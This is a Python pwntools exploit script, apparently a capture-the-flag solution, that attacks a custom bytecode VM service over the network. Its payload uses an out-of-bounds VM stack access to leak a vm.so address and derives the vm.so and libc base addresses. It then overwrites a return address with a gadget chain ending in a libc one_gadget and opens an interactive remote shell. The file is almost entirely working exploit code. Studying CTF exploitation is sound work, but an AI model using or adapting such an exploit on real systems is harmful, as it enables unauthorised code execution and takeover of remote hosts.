#!/usr/bin/env python2

import sys

from pwn import *
from constants import *


def main(io):
    leak_offset = VM_STACK_SIZE + 8
    ret_offset = -(VM_DATA_SIZE + VM_PROGRAM_SIZE + 18)

    vm_run_offset = 0xE2B
    libc_offset = -0x3CA000
    eax_gadget_offset = 0xEB9   # mov eax, 0; pop rbp; ret
    one_gadget_offset = 0x45216

    payload = [
        # leak vm.so
        OP_SET, REG_SP, leak_offset,
        OP_POP, 101,
        OP_POP, 100,
        # calculate base address (vm.so)
        OP_SET, REG_AX, vm_run_offset,
        OP_SUB, 100, REG_AX,
        # copy base address
        OP_MOV, 200, 100,
        OP_MOV, 201, 101,
        # calculate eax_gadget address (vm.so)
        OP_SET, REG_AX, eax_gadget_offset,
        OP_ADD, 100, REG_AX,
        # calculate one_gadget address (libc)
        OP_SET, REG_AX, libc_offset + one_gadget_offset,
        OP_ADD, 200, REG_AX,
        # set vm stack pointer
        OP_SET, REG_SP, ret_offset,
        # put eax_gadget on stack
        OP_PUSH, 100,
        OP_PUSH, 101,
        # put eax_gadget argument on stack (not used)
        OP_PUSH, 0,
        OP_PUSH, 0,
        # put one_gadget on stack
        OP_PUSH, 200,
        OP_PUSH, 201,
        # exit to shell
        OP_SYS, SYS_EXIT
    ]

    io.sendlineafter('Exit\n', '1')
    io.sendlineafter('length:\n', str(len(payload)))
    io.sendlineafter('program:\n', ''.join(p32(c % (1<<32)) for c in payload))
    io.sendlineafter('No\n', '1')
    io.interactive()


if __name__ == '__main__':
    io = remote(sys.argv[1], 5555)
    try:
        main(io)
    finally:
        io.close()
